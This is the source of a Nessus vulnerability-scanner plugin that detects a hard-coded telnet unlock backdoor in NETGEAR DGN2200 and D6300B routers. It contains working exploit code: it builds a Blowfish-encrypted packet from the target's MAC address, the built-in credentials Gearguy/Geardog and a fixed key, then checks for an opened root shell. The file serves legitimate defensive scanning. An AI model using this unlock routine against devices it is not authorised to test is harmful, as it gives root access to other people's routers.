#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(72831);
  script_version("$Revision: 1.3 $");
  script_cvs_date("$Date: 2016/05/19 18:02:20 $");

  script_bugtraq_id(65444);
  script_osvdb_id(102901);
  script_xref(name:"EDB-ID", value:"31617");

  script_name(english:"NETGEAR Hard-coded Telnet Unlock Credentials");
  script_summary(english:"Tries to unlock telnet login");

  script_set_attribute(
    attribute:"synopsis",
    value:
"The remote host has a default set of credentials for enabling root
login on the telnet service."
  );
  script_set_attribute(
    attribute:"description",
    value:
"The remote NETGEAR device has a hard-coded set of credentials that can
be sent in a specially encoded packet in order to unlock the telnet
service and allow remote logins as the root user."
  );
  script_set_attribute(
    attribute:"solution",
    value:
"There are no known fixes.  As a workaround, restrict access to the
telnet port."
  );
  script_set_cvss_base_vector("CVSS2#AV:A/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2014/02/12");
  script_set_attribute(attribute:"plugin_publication_date", value:"2014/03/05");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"x-cpe:/h:netgear:dgn2200");
  script_set_attribute(attribute:"cpe", value:"x-cpe:/h:netgear:d6300b");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_set_attribute(attribute:"default_account", value:"true");
  script_end_attributes();

  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_family(english:"Misc.");

  script_copyright(english:"This script is Copyright (C) 2014-2016 Tenable Network Security, Inc.");

  script_dependencies("account_check.nasl", "telnetserver_detect_type_nd_version.nasl");
  script_exclude_keys("global_settings/supplied_logins_only");
  script_require_ports("Services/telnet", 23);

  exit(0);
}

include("audit.inc");
include("misc_func.inc");
include("global_settings.inc");
include("ssh1_func.inc");

if (supplied_logins_only) audit(AUDIT_SUPPLIED_LOGINS_ONLY);

# generate an unlock packet to open up the telnet port
function generate_unlock_packet(mac)
{
  local_var clear_text, encr_payload, ret_val, tmp, i;

  clear_text = mac + '\0\0\0\0' +
               'Gearguy' + crap(data:'\0', length:9) +
               'Geardog' + crap(data:'\0', length:9) +
               crap(data:'\0', length:64);

  encr_payload = MD5(clear_text) + clear_text;

  blowfish_initialize(key:'AMBIT_TELNET_ENABLE+Geardog');

  ret_val = '';

  for (i = 0; i < strlen(encr_payload) / 8; i++)
  {
    tmp = substr(encr_payload, i*8, i*8 + 7);
    ret_val += blowfish_encipher(data:tmp);
  }

  return ret_val;
}

function is_busybox(data)
{
  if ("BusyBox v" >< data && "list of built-in commands" >< data) return TRUE;
  else return FALSE;
}

if (!islocalnet()) exit(0, "This plugin only runs against local network hosts.");

arp_mac = get_kb_item_or_exit('ARP/mac_addr');
arp_mac = str_replace(find:':', replace:'', string:arp_mac);
arp_mac = str_replace(find:'-', replace:'', string:arp_mac);
arp_mac = toupper(arp_mac);

port = get_service(svc:"telnet", default:23, exit_on_fail:TRUE);

if (!get_port_state(port)) audit(AUDIT_PORT_CLOSED, port);
soc = open_sock_tcp(port);
if (!soc) audit(AUDIT_SOCK_FAIL, port);

data = recv(socket:soc, length:4096);

if (is_busybox(data:data)) exit(0, "The Telnet service on port " + port + " may already be unlocked.");

close(soc);

soc = open_sock_tcp(port);
if (!soc) audit(AUDIT_SOCK_FAIL, port);

unlock_pkt = generate_unlock_packet(mac:arp_mac);

send(socket:soc, data:unlock_pkt);
close(soc);

soc = open_sock_tcp(port);
if (!soc) audit(AUDIT_SOCK_FAIL, port);

data = recv(socket:soc, length:4096);

if (is_busybox(data:data))
{
  if (report_verbosity > 0)
  {
    report = '\n' + 'Nessus was able to unlock the device by sending a special packet with' +
             '\n' + 'the following credentials :\n' +
             '\n' + '  Username : Gearguy' +
             '\n' + '  Password : Geardog' +
             '\n';
    if (report_verbosity > 1)
      report += '\n' + 'Login banner :\n\n' +
                chomp(strstr(data, "BusyBox")) + '\n';
    security_hole(port:port, extra:report);
  }
  else security_hole(port);
}
else audit(AUDIT_LISTEN_NOT_VULN, "Telnet", port);
